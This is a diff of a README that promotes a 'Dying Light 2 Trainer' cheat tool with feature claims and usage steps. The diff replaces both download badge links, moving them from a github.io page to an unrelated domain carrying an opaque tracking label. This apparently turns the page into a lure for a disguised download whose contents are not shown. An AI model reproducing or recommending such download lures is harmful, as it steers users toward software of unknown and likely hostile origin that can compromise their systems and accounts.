@@ -2,7 +2,7 @@
 
 The **Dying Light 2 Trainer** is your ultimate tool to conquer the post-apocalyptic world filled with zombies, hostile factions, and countless dangers. With this trainer, you can modify your game experience and enhance your abilities, making survival easier and unlocking new possibilities. Whether you're struggling to survive, want to explore the game without limitations, or simply want to take your gameplay to the next level, the **Dying Light 2 Trainer** is here to help.
 
-[![Download DL2 Trainer](https://img.shields.io/badge/Download-DL2%20Trainer-blueviolet)](https://dying-light-2-trainer.github.io/.github/)
+[![Download DL2 Trainer](https://img.shields.io/badge/Download-DL2%20Trainer-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 This trainer offers a variety of powerful features to help you in your quest to survive and thrive in the world of *Dying Light 2*. From infinite health and stamina to enhanced combat abilities and special powers, you’ll be able to face the harsh environment with ease. Explore the open world, fight off zombies, complete missions, and take control of the narrative in ways you never thought possible.
 
@@ -47,4 +47,4 @@ The **Dying Light 2 Trainer** is compatible with the latest versions of *Dying L
 4. Use the hotkeys or menu to activate the cheats you want to use.
 5. Enjoy a boosted gameplay experience and explore the world of *Dying Light 2* with enhanced abilities.
 
-[![Download DL2 Trainer](https://img.shields.io/badge/Download-DL2%20Trainer-blueviolet)](https://dying-light-2-trainer.github.io/.github/)
+[![Download DL2 Trainer](https://img.shields.io/badge/Download-DL2%20Trainer-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
